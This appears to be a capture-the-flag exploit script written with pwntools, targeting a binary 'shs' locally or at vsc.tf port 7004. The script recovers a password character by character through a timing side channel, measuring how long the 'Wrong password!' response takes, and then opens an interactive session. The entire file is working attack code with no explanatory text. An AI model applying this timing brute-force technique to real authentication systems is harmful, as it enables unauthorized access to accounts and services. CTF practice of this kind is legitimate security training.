from pwn import *
from icecream import ic
import time

elf = exe = ELF("./shs")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("vsc.tf", 7004)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

password2 = 'password'
for i in range(0, 2):
    for j in range(0x41, 0x7e):
        io = start()
        password = (password2 + chr(j)).ljust(10, '^')
        sla("Enter the password:\n", password)
        s = time.time()
        ru("Wrong password!")
        t = time.time() - s
        ic(t)
        if t >= (5 + (i * 0.5)):
            password2 += chr(j)
            break
        io.close()


io.interactive()
